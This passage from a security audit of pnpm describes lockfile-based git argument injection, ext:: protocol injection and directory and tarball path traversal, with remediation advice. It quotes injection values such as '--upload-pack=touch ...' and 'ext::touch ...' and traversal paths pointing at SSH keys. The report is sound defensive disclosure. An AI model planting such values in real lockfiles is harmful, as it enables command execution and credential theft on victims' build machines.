The git fetcher at `fetching/git-fetcher/src/index.ts:33` passes `resolution.commit` from the lockfile directly to `git fetch` as a positional argument without a `--` separator. Git parses all arguments before `--` as options. If `resolution.commit` is `--upload-pack=<command>`, git treats it as the `--upload-pack` option, which specifies the program to invoke as the upload-pack binary on the remote side. For `file://` and SSH transports, git shells out the specified command. The command executes before git determines that the specified program is not a valid upload-pack binary, causing the fetch to fail -- but the injected command has already run.

#### Vulnerable Code

```typescript
// fetching/git-fetcher/src/index.ts:30-33 (vulnerable path)
if (allowedHosts.size > 0 && shouldUseShallow(resolution.repo, allowedHosts)) {
  await execGit(['init'], { cwd: tempLocation })
  await execGit(['remote', 'add', 'origin', resolution.repo], { cwd: tempLocation })
  await execGit(['fetch', '--depth', '1', 'origin', resolution.commit], { cwd: tempLocation })
  // ^ resolution.commit passed without -- separator; git parses it as an option
}
```

The shallow fetch path (line 30) is taken when the repo's URL host matches a value in `gitShallowHosts`. The default `gitShallowHosts` list includes `github.com`, `gist.github.com`, `gitlab.com`, `bitbucket.com`, and `bitbucket.org`.

#### Attack Scenario

1. Attacker gains write access to the project's `pnpm-lock.yaml`.
2. Attacker locates a git dependency whose `resolution.repo` host is in `gitShallowHosts` and uses SSH transport (e.g., `git+ssh://git@github.com/...`).
3. Attacker replaces the 40-char hex `commit:` value with `'--upload-pack=<malicious command>'`.
4. Victim runs `pnpm install`. The shallow fetch path is taken, and git executes the injected command during `git fetch --depth 1 origin '--upload-pack=<malicious command>'`.
5. The fetch fails, but the command has already executed.

#### Proof of Concept

```bash
bash autofyn_audit/exploits/vuln11_git_upload_pack_rce/exploit.sh
# Expected: PASS -- /tmp/vuln11_pwned created by injected touch command
```

The exploit creates a local bare git repo, installs it as a git dependency with `file://githost/...` URL and `pnpm_config_git_shallow_hosts='["githost"]'` env var to trigger the shallow fetch path. After generating a valid lockfile, it replaces the 40-char hex commit hash with `'--upload-pack=touch /tmp/vuln11_pwned'`. After clearing the store and re-running install, the marker file is created by the injected `touch` command.

> **PoC note:** The exploit uses `file://githost/...` as the repo URL because `--upload-pack` injection requires a local or SSH transport. HTTPS transport ignores `--upload-pack`. In real-world attacks, the victim's project would need an SSH-transported git dependency (`git+ssh://git@github.com/...`). While `github.com` is in the default `gitShallowHosts`, most GitHub dependencies use HTTPS URLs, not SSH.

#### Impact

Argument injection that can achieve code execution under specific conditions: the git dependency must use SSH or local transport (not HTTPS), and the repo host must be in `gitShallowHosts`. For dependencies using HTTPS URLs (the common case for GitHub), `--upload-pack` is ignored by git and the injection has no effect.

#### Caveats

- **HTTPS transport is immune.** The `--upload-pack` flag is ignored when git uses the HTTPS transport, which is the default for most GitHub/GitLab/Bitbucket dependencies. The attack only works with SSH (`git+ssh://`) or local (`file://`) transports.
- **SSH git dependencies are uncommon in open-source projects.** Most open-source projects reference git dependencies via HTTPS URLs. SSH URLs are more common in private/enterprise projects, narrowing the attack surface.
- **Requires lockfile modification.** As with other lockfile-based attacks, the attacker must have write access to `pnpm-lock.yaml`.
- **npm and yarn also lack `--` separators in git fetch commands.** This class of argument injection applies to other package managers as well.

#### Remediation

1. **Add `--` separator before `resolution.commit`:** Change `execGit(['fetch', '--depth', '1', 'origin', resolution.commit])` to `execGit(['fetch', '--depth', '1', 'origin', '--', resolution.commit])` and similarly for `execGit(['checkout', resolution.commit])`. This prevents git from interpreting the commit value as an option.
2. **Validate commit format:** Before passing to git, assert that `resolution.commit` matches `/^[0-9a-f]{40}$/`. Reject any value that is not a valid 40-char hex SHA1. This eliminates the attack surface entirely.
3. **Apply validation at the lockfile reader level:** `lockfile/types/src/index.ts` should enforce the commit format constraint so that malformed commit values are rejected before they reach the fetcher.

---

### PNPM-006: Lockfile Resolution Path Traversal (Directory and Tarball Fetchers)

**Severity:** Medium -- 4.5 (AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N)
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
**Proof of Concept (directory):** `exploits/vuln9_directory_traversal/exploit.sh`
**Proof of Concept (tarball):** `exploits/vuln10_tarball_path_traversal/exploit.sh`

#### Affected Code

**Directory fetcher path:**

| File | Lines | Role |
|------|-------|------|
| `fetching/directory-fetcher/src/index.ts` | 30 | `path.resolve(opts.lockfileDir, resolution.directory)` -- no bounds check |
| `lockfile/utils/src/pkgSnapshotToResolution.ts` | 16-21 | Returns `pkgSnapshot.resolution` as-is when `type` field is truthy |
| `fetching/pick-fetcher/src/index.ts` | 54 | Routes `resolution.type === 'directory'` to `directoryFetcher` |
| `deps/graph-builder/src/lockfileToDepGraph.ts` | 217, 282-294 | Builds dep graph from lockfile, calls `storeController.fetchPackage` with unsanitized resolution |

**Local tarball fetcher path:**

| File | Lines | Role |
|------|-------|------|
| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 19 | `resolvePath(opts.lockfileDir, resolution.tarball.slice(5))` -- no bounds check |
| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 20 | `gfs.readFileSync(tarball)` -- reads arbitrary resolved path |
| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 38-41 | `resolvePath` accepts absolute or relative paths with no containment check |
| `fetching/pick-fetcher/src/index.ts` | 41 | `resolution.tarball.startsWith('file:')` routes to `localTarball` fetcher |

#### Description

Two fetcher code paths trust lockfile-provided resolution fields without path containment checks, enabling an attacker who can modify the lockfile to read arbitrary directories or files from the build machine.

**Directory fetcher:** The directory fetcher at `fetching/directory-fetcher/src/index.ts:30` resolves `resolution.directory` from lockfile entries using `path.resolve(opts.lockfileDir, resolution.directory)` with no validation that the resolved path is within the project or workspace boundary. When a lockfile entry's resolution is changed from a tarball type to a directory type (`{type: directory, directory: '../../../../../../sensitive_dir'}`), `pkgSnapshotToResolution` sees the truthy `type` field and returns the resolution verbatim. The directory fetcher reads all files from the target directory into the content-addressable store and hardlinks them into `node_modules/<package>/`.

#### Vulnerable Code

```typescript
// fetching/directory-fetcher/src/index.ts:26-31 (vulnerable)
const directoryFetcher: DirectoryFetcher = (cafs, resolution, opts) => {
  const dir = path.resolve(opts.lockfileDir, resolution.directory)  // no bounds check
  return fetchFromDir(dir)
}
```

**Local tarball fetcher:** The local tarball fetcher at `fetching/tarball-fetcher/src/localTarballFetcher.ts:19` resolves the tarball path by stripping the `file:` prefix from `resolution.tarball` via `.slice(5)` and passing the result to `resolvePath(opts.lockfileDir, ...)`. The `resolvePath` helper simply calls `path.resolve(where, spec)` with no containment check. The resolved path is passed directly to `gfs.readFileSync(tarball)`, reading the file from disk and importing it into `node_modules/`.

```typescript
// fetching/tarball-fetcher/src/localTarballFetcher.ts:17-20 (vulnerable)
const fetch = (cafs: Cafs, resolution: Resolution, opts: FetchOptions) => {
  const tarball = resolvePath(opts.lockfileDir, resolution.tarball.slice(5))  // no bounds check
  const buffer = gfs.readFileSync(tarball)  // reads arbitrary path
  return addFilesFromTarball({ ..., buffer, ... })
}
```

#### Attack Scenario

1. Attacker gains write access to the project's `pnpm-lock.yaml` AND `package.json` (pull request, compromised CI, compromised developer machine, or direct repo access).
2. For the directory variant: attacker modifies a package's `resolution` in the lockfile from tarball to directory type with a path traversal (`{directory: ../../../../../../home/user/.ssh, type: directory}`), updates the `packages:` entry key to `pkg@file:../../../../../../home/user/.ssh`, and changes `package.json` to `"pkg": "file:../../../../../../home/user/.ssh"`.
3. For the tarball variant: attacker changes the `resolution` to `{tarball: 'file:../../../../../../../tmp/secrets/sensitive.tgz'}`, removes the `integrity` field, and updates `package.json` to match.
4. Victim runs `pnpm install`.
5. The fetcher reads the target directory contents or tarball file from disk and hardlinks them into `node_modules/<package>/`.
6. A postinstall script from any other package -- or any project script -- can read and exfiltrate the stolen files.

#### Proof of Concept

**Directory variant:**
```bash
# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
bash autofyn_audit/exploits/vuln9_directory_traversal/exploit.sh
# Expected: PASS -- secret_key.pem and credentials.json found in node_modules/dir-traversal-target/
```

The exploit creates a sensitive target directory at `/tmp/vuln9_secrets/` containing fake credentials, publishes a legitimate package to verdaccio, generates a lockfile, then tampers the lockfile to redirect the resolution to the secrets directory. After re-running install, the sensitive files appear in `node_modules/dir-traversal-target/`.

**Tarball variant:**
```bash
# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
bash autofyn_audit/exploits/vuln10_tarball_path_traversal/exploit.sh
# Expected: PASS -- secret_ssh_key.pem and api_credentials.json found in node_modules/tarball-read-target/
```

The exploit creates a sensitive tarball at `/tmp/vuln10_secrets/stolen_data.tgz`, publishes a legitimate package, generates a lockfile, then tampers the lockfile to redirect to the local tarball. After re-running install, the sensitive files appear in `node_modules/tarball-read-target/`.

#### Impact

Data exfiltration from the build machine. An attacker who can modify the lockfile and `package.json` can silently redirect a dependency resolution to read sensitive directories or files on disk. SSH keys, cloud credentials, database configs, and proprietary source code are potential targets. The attack is relevant in CI/CD environments where `pnpm install --frozen-lockfile` is used and the lockfile is trusted.

#### Caveats

- **Requires modifying BOTH lockfile AND package.json.** This is a significant precondition. The attacker must change the dependency specifier in `package.json` to a `file:` reference that matches the lockfile entry. A PR that changes both `package.json` and the lockfile simultaneously is more likely to attract review attention than a lockfile-only change.
- **Limited incremental impact.** An attacker with the ability to modify `package.json` can add a direct `file:` dependency pointing anywhere on disk without needing to tamper the lockfile. The lockfile path traversal provides little additional capability beyond what the `package.json` change already enables. The finding is a defense-in-depth gap: pnpm should validate resolution paths regardless, but the incremental attack surface is limited.
- **npm and yarn handle `file:` dependencies similarly.** The `file:` protocol is designed to reference local packages, and other package managers also resolve these paths without strict containment. The concern is shared across the ecosystem.

#### Remediation

1. **Validate resolved paths:** After resolving `resolution.directory` or `resolution.tarball`, check that the result is within the project or workspace root. Reject paths that escape via `!resolvedPath.startsWith(workspaceRoot)`.
2. **Validate resolution type consistency:** When reading lockfile entries, verify that the resolution type is consistent with the dependency specifier (e.g., a semver specifier should not resolve to a directory type).
3. **Reject `..` components:** In `resolvePath` or before calling it, reject any spec that contains `..` path components.
4. **Require integrity for local tarballs:** When installing from a `file:` tarball, require an `integrity` field and verify the hash before importing.

---

### PNPM-007: Git ext:: Protocol Injection via Lockfile (Conditional RCE)

**Severity:** Low -- 2.6 (AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N)
**CWE:** CWE-20 (Improper Input Validation)
**Proof of Concept:** `exploits/vuln4_git_ext_rce/exploit.sh`

#### Affected Code

| File | Lines | Role |
|------|-------|------|
| `fetching/git-fetcher/src/index.ts` | 32, 35 | `resolution.repo` passed unsanitized to `execGit(['remote', 'add', ...]`) and `execGit(['clone', ...])` |
| `fetching/git-fetcher/src/index.ts` | 97-101 | `execGit` wraps `safeExeca('git', args)` with `shell: false` |
| `resolving/git-resolver/src/parseBareSpecifier.ts` | 23-32 | `gitProtocols` allowlist blocks `ext::` from package.json but NOT from lockfile entries |
| `resolving/git-resolver/src/index.ts` | 28-52 | Early return when lockfile entry exists, skipping re-resolution through the allowlist |

#### Description

The git-fetcher at `fetching/git-fetcher/src/index.ts` passes `resolution.repo` from the lockfile directly to `git clone` (line 35, non-shallow path) or to `git remote add origin` (line 32, shallow path) without any URL or protocol validation. The `parseBareSpecifier` function in `git-resolver` maintains a `gitProtocols` allowlist that blocks `ext::` and other unsafe protocols, but this check only applies during package.json resolution -- it is bypassed entirely when the resolver returns early at lines 34-51 of `resolving/git-resolver/src/index.ts` because the package already has a lockfile entry. When `GIT_ALLOW_PROTOCOL` includes `ext`, an attacker who modifies `pnpm-lock.yaml` can set `repo: 'ext::COMMAND ARGS'` to achieve arbitrary command execution via git's remote-ext helper.

#### Vulnerable Code

```typescript
// fetching/git-fetcher/src/index.ts:28-36 (vulnerable path)
const gitFetcher: GitFetcher = async (cafs, resolution, opts) => {
  const tempLocation = await cafs.tempDir()
  if (allowedHosts.size > 0 && shouldUseShallow(resolution.repo, allowedHosts)) {
    await execGit(['remote', 'add', 'origin', resolution.repo], { cwd: tempLocation })
    // ... shallow fetch
  } else {
    await execGit(['clone', resolution.repo, tempLocation])  // resolution.repo unsanitized
  }
```

The `ext::` git transport splits the string after `ext::` on spaces to form the command and arguments passed to `execvp`. So `ext::touch /tmp/vuln4_pwned` causes git to execute `touch /tmp/vuln4_pwned` before returning, even though the clone itself fails.

#### Attack Scenario

1. Attacker gains write access to the project's `pnpm-lock.yaml` (pull request, compromised CI, compromised developer machine, or direct repo access).
2. Attacker edits the git resolution entry's `repo:` field to `'ext::MALICIOUS_COMMAND'`.
3. Victim CI has `GIT_ALLOW_PROTOCOL` set to include `ext` (some CI environments enable this for advanced git hosting).
4. `pnpm install --frozen-lockfile` passes the tampered `repo:` value directly to `git clone`, which invokes `MALICIOUS_COMMAND` via the git-remote-ext transport.

#### Proof of Concept

```bash
bash autofyn_audit/exploits/vuln4_git_ext_rce/exploit.sh
# Expected: PASS -- marker file /tmp/vuln4_pwned created by git-remote-ext
```

The exploit creates a local bare git repo, installs it as a git dependency to generate a valid lockfile, then tampers the `repo:` field using python3 with proper YAML single-quoting to ensure the space in `ext::touch /tmp/vuln4_pwned` is preserved. After clearing the store and re-running install with `GIT_ALLOW_PROTOCOL=ext:file:https`, the marker file is created before git reports a clone failure.

> **PoC limitation:** The exploit sets `GIT_ALLOW_PROTOCOL=ext:file:https` explicitly to demonstrate the code path. In default git configurations (git 2.12+), `ext::` is blocked by git's own protocol allow-list.

#### Impact

Conditional RCE, contingent on the non-default `GIT_ALLOW_PROTOCOL` environment variable including `ext`. The defense-in-depth gap means pnpm relies entirely on git's own default-deny for `ext::`. The missing validation is pnpm's responsibility: the lockfile is an attacker-controlled input that pnpm should validate before forwarding to git.

#### Caveats

- **Git blocks `ext::` by default since git 2.12 (2017).** The `protocol.ext.allow` config defaults to `never`. Exploitation requires either `GIT_ALLOW_PROTOCOL=ext` or `protocol.ext.allow=always` in git config, both of which are non-default and uncommon.
- **npm and yarn do not validate git URLs from lockfiles either.** This class of issue (trusting lockfile-provided git URLs) is shared across package managers, though each should independently validate.
- **Practical impact is low.** The combination of lockfile write access + non-default git protocol config makes real-world exploitation unlikely. This is a defense-in-depth improvement rather than an actively exploitable vulnerability.

#### Remediation

1. **Validate `resolution.repo` against a protocol allowlist** in `git-fetcher/src/index.ts` before passing to git, rejecting any URL that does not begin with a known-safe protocol (`https://`, `http://`, `git://`, `ssh://`, `file://`).
2. **Add `--` separator** between flags and positional args in all `execGit` calls (e.g., `execGit(['clone', '--', resolution.repo, tempLocation])`) to prevent flag injection.
3. **Apply the `gitProtocols` allowlist at the fetcher level**, not only during package.json resolution.

---

## Reproduction Instructions

### Prerequisites

- Node.js v22+
- pnpm source checkout at commit `976504f`
- Build: `pnpm install && pnpm --filter pnpm run compile`

### Run All Exploits

```bash
bash autofyn_audit/setup.sh      # Start verdaccio test registry
bash autofyn_audit/run_all_exploits.sh  # Run all 12 PoCs
bash autofyn_audit/teardown.sh   # Cleanup
```

### Expected Output

12/12 PASS (9 individual PoC scripts + 3 chain scripts)

### Cleanup

```bash
bash autofyn_audit/teardown.sh
```

---

## Conclusion

The audit contains seven findings reproduced or source-confirmed against pnpm v11.2.2 at commit 976504f. PNPM-004, PNPM-005, PNPM-001, and PNPM-002 are the primary report candidates. PNPM-003, PNPM-006, and PNPM-007 are best treated as additional hardening observations unless maintainers request separate issues.

PNPM-004 is the cleanest finding: pnpm applies patch file paths without containing them to the patched package directory. PNPM-005 demonstrates argument injection in git fetch via `resolution.commit`, with practical impact limited to SSH/local transports because HTTPS ignores the injected `--upload-pack` flag. PNPM-001 shows that `pnpm install --frozen-lockfile` does not fail closed when a remote tarball lockfile entry lacks integrity, but exploitation requires both lockfile tampering and control over the served tarball content. PNPM-002 reveals an incomplete implementation in the `allowBuilds` security policy: lifecycle scripts are blocked but bin linking is not, enabling PATH shadowing from a supposedly contained package if another script invokes the shadowed command. PNPM-003 is a straightforward hardening fix (compare origin, not just host) that prevents auth token leakage on protocol-downgrade redirects, though it requires a MITM position or compromised registry to exploit. PNPM-006 shows that both the directory fetcher and local tarball fetcher trust lockfile-provided paths without containment checks, though exploitation requires modifying both the lockfile and `package.json` -- a limited-incremental-impact threat model since `package.json` changes can achieve the same outcome directly. PNPM-007 is a low-severity defense-in-depth gap where pnpm delegates git protocol validation to git itself rather than validating lockfile-provided URLs.

A recurring theme across findings PNPM-007, PNPM-004, PNPM-006, and PNPM-005 is that the attacker must already have a significant level of access (lockfile modification, repository commit access) that often enables equivalent damage through other vectors. These findings represent defense-in-depth improvements: pnpm should validate its inputs regardless of the trust model upstream, but the incremental security benefit should be weighed honestly against the preconditions required.

CHAIN-2 is the strongest chain because it combines the write and delete variants of the same patch traversal root cause. CHAIN-1 and CHAIN-3 are retained as impact demonstrations, with the same PNPM-006 precondition caveat described above.

Recommended remediation priority: PNPM-004 > PNPM-005 > PNPM-001 > PNPM-002 > PNPM-003 > PNPM-006 > PNPM-007.

---

## Files Delivered

```
autofyn_audit/
├── audit_report.md
├── setup.sh
├── teardown.sh
├── run_all_exploits.sh
├── docs/
│   ├── PNPM-001.md
│   ├── PNPM-002.md
│   ├── PNPM-004.md
│   └── PNPM-005.md
└── exploits/
    ├── vuln1_integrity_bypass/
    ├── vuln2_auth_downgrade/
    ├── vuln4_git_ext_rce/
    ├── vuln5_bin_shadow/
    ├── vuln6_patch_traversal_write/
    ├── vuln7_patch_traversal_delete/
    ├── vuln9_directory_traversal/
    ├── vuln10_tarball_path_traversal/
    ├── vuln11_git_upload_pack_rce/
    ├── chain1_lockfile_credential_theft/
    ├── chain2_patch_ssh_backdoor/
    └── chain3_policy_bypass_theft/
```
